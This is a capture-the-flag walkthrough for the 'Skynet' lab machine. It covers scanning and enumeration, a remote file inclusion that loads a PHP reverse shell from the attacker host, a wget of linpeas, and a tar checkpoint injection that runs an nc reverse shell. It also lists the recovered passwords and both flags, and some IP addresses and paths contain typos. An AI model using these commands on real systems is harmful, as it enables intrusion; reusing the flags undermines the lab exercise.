# Skynet

> A vulnerable Terminator themed Linux machine.

<br>

### Process:

1. discovery and scanning:
	- find if machine is up: `sudo nmap -sn 10.10.60.122` = yes
	- port scan machine:
		- `sudo nmap -T4 10.10.60.122`
		- `sudo nmap -T4 -A -p 22,80,110,139,143,445 10.10.60.122`
2. enumeration:
	- check out the website on port 80
	- enumerate SMB:
		- `smbmap -H 10.10.60.122` - found "anonymous" share with read permissions
		- `smbclient \\\\10.10.160.122\\anonymous` - found "attention.txt" and "log1.txt"
			- "log1.txt" contains a list of possible passwords
	- try bruteforcing pop3 login with passwords in "log1.txt":
		- find miles username: `sudo nmap -p 445 --script=smb-enum-users 10.10.160.122` = "milesdyson"
	- try to find email login on web page:
		- `gobuster dir -u http://10.10.60.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
		- found: "/squirrelmail"
	- use Burp intruder to try and login using "log1.txt" as password payload list
		- miles password for emails = **cyborg007haloterminator**
3. exploitation:
	- login to miles email account at "http://10.10.160.122/squirrelmail"
	- found new SMB password in emails = *)s{A&2Z=F^n_E.B\`*
	- use SMB password to login to miles SMB share:
		- `smbclient \\\\10.10.60.122\\milesdyson -U "milesdyson"` -> [new SMB password]
	- look through SMB share
		- found "important.txt" file that contains a CMS URL "/45kra24zxs28v3yd"
	- go to new CMS URL found 
	- name of hidden directory = **45kra24zxs28v3yd**
	- name of vulnerability when you include a remote file for malicious purposes = **remote file inclusion**
	- run goBuster on hidden directory:
		- `gobuster dir -u http://10.10.60.122/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
		- found "adminstrator" directory which is a login to Cuppa CMS
	- use searchsploit to look for exploits:
		- `searchsploit cuppa cms`
		- found a RFI vulnerability in "[target]/alerts/alertConfigField.php?urlConfig=[RFI]"
	- exploit RFI vulnerability
		- create PHP reverse shell and host it on attacker machine
		- navigate to shell via URL on target: `http://10.10.60.122/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.31.198:8080/shell.php`
4. post-exploitation:
	- stablise shell: `bash -i` -> `python -c 'import pty;pty.spawn("/bin/bash")'`
	- find the user flag:
		- `cd /home/milesdyson` -> `cat user.txt`
		- user flag = **7ce5c2109a40f958099283600a9aae807**
	- esclate privileges:
		- load "linpeas.sh" onto system
		- host on attack machine and on targert machine: `cd /var/www/html` -> `wget http://10.11.31.198:8080/linpeas.sh`
		- run linpeas: `chmod u+x linpeas.sh` -> `./linpeas.sh`
		- found "backup.sh" which can be run with root privileges 
		- the file creates a backup of the "/var/www/html" directory, but uses tar wildcards (`*`) to do so, which means you can use checkpoint actions to execute commands
		- setup reverse shell action to execute:
			```bash
			echo "rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc 10.11.31.198 4444 > /tmp/f" > shell.sh
			touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
			touch "/var/www/html--checkpoint=1"
			```
		- setup netcat listener on attack machine: `nc -lvnp 4444`
		- run the "backup.sh" script: `./home/milesdyson/backups/backup.sh`
	- find root flag:
		- `cd /root` -> `cat root.txt`
		- root flag = **3f0372db24753accc7179a282cd6a949**
